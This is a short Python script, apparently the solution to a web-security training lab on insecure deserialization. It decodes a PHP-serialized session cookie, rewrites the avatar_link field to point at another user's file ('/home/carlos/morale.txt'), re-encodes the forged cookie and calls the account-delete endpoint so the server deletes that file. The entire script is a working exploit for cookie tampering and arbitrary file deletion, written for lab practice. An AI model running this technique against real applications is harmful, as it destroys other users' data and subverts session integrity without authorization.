import sys
import os
import base64
from urllib.parse import unquote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("gregg", "rosebud")

cookie = lab.session.cookies.get("session")
raw = base64.b64decode(unquote(cookie)).decode()
lab.info(f"Original: {raw}")

# change the avatar_link to point at the target file
# when we delete the account, the app deletes the file at avatar_link
import re
modified = re.sub(r'(s:\d+:"avatar_link";)s:\d+:"[^"]*"',
                  r'\g<1>s:23:"/home/carlos/morale.txt"', raw)
lab.info(f"Modified: {modified}")

new_cookie = base64.b64encode(modified.encode()).decode()
lab.session.cookies.set("session", new_cookie)

# trigger the delete account functionality which deletes the avatar file
lab.info("Deleting account to trigger file deletion...")
lab.post("/my-account/delete")

lab.check_solved()
